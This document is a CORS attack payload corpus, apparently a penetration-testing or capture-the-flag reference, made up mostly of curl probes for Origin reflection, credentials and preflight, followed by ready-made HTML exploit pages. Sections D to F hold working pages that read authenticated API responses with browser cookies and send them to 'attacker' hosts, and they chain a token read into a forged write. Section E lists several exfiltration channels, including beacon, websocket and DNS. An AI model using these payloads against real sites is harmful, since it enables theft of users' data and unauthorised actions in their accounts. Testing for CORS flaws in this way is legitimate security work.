# Payload dictionary — the CORS payload corpus

Every probe and exploit shape, categorized. Each is a self-contained
test for a specific gate.

---

## A. The Origin-reflection probes — the measurement battery

```bash
# the base battery — each Origin tested
ORIGINS=(
'https://evil.com'
'https://target.com.evil.com'
'https://evil-target.com'
'https://eviltarget.com'
'https://sub.target.com'
'https://target.com@evil.com'
'https://evil.com?target.com'
'https://evil.com#target.com'
'null'
'https://target.com%60.evil.com'
'https://target.com_.evil.com'
'https://target.com-.evil.com'
'https://target.com:443'
'https://target.com.'
'https://target.com%2eevil.com'
'HTTP://TARGET.COM'
'https://evil.com:443'
)
for o in "${ORIGINS[@]}"; do
  echo -n "$o -> "
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin' || echo 'no ACAO'
done
```

## B. The credential-mode probes — ACAC + SameSite

```bash
# ACAC read
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -i 'access-control-allow-credentials'

# the cookie's SameSite — does it ride the fetch?
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
```

## C. The preflight probes

```bash
# a preflight for a custom header
curl -i -X OPTIONS "$BASE/api/x" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: X-Token'

# a preflight for a non-simple method
curl -i -X OPTIONS "$BASE/api/x" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: PUT'
```

## D. The exploit pages — the read+exfil composite

```html
<!-- the canonical read+exfil -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://attacker/x?d='+btoa(JSON.stringify(d))))
</script>
```

```html
<!-- a null-origin sandboxed read -->
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.text()).then(d=>parent.postMessage(d,'*'));
</script>">
</iframe>
<script>window.onmessage=e=>fetch('https://attacker/?d='+e.data)</script>
```

```html
<!-- a token-read → CSRF-write chain -->
<script>
fetch('https://t/api/csrf-token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t/api/change',{method:'POST',
    credentials:'include',headers:{'X-CSRF':t.token},
    body:'a=1'}))
</script>
```

```html
<!-- a DOM-scrape read — the flag in HTML -->
<script>
fetch('https://t/admin/flag',{credentials:'include'})
 .then(r=>r.text())
 .then(h=>{var m=h.match(/FLAG\{[^}]+\}/);
   if(m)fetch('https://attacker/?f='+m[0]);})
</script>
```

```html
<!-- a multi-endpoint chain read -->
<script>
fetch('https://t/api/token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t/api/admin',{credentials:'include',
   headers:{'X-Token':t.token}}))
 .then(r=>r.json())
 .then(d=>fetch('https://attacker/?d='+btoa(JSON.stringify(d))))
</script>
```

## E. The exfil channels

```js
// a GET to the listener
fetch('https://attacker/x?d='+encodeURIComponent(data))
// a beacon
navigator.sendBeacon('https://attacker/x',data)
// an image GET
new Image().src='https://attacker/x?d='+btoa(data)
// a websocket
var w=new WebSocket('wss://attacker/x');w.onopen=()=>w.send(data)
// a DNS exfil
new Image().src='https://'+btoa(d)+'.attacker.com/'
// a postMessage to the parent (an iframe context)
parent.postMessage(data,'*')
```

## F. The JSONP/alternate probes

```bash
# is the endpoint JSONP?
curl -s -b "$CJ" "$BASE/api/me?callback=x" | head -1
# 'x({...})' → a script-tag read
```

```html
<!-- a JSONP read -->
<script src="https://t/api/me?callback=leak"></script>
<script>function leak(d){fetch('https://attacker/?d='+JSON.stringify(d))}</script>
```

## G. The preflight-bypass simple reads

```js
// a GET — simple, no preflight
fetch('https://t/api/x',{credentials:'include'})
// a urlencoded POST — simple
fetch('https://t/api/x',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'q=x'})
```

## H. The corpus index — probe → what it tests

| Probe | Tests |
|---|---|
| reflected-Origin | open reflection |
| `null` Origin | opaque-origin allow |
| lookalike Origins | substring/prefix/suffix check |
| `*.target.com` | subdomain trust |
| ACAC:true | credentials allowed |
| cookie SameSite | does the credential ride |
| preflight OPTIONS | method/header allows |
| a JSONP callback | a script-tag read |
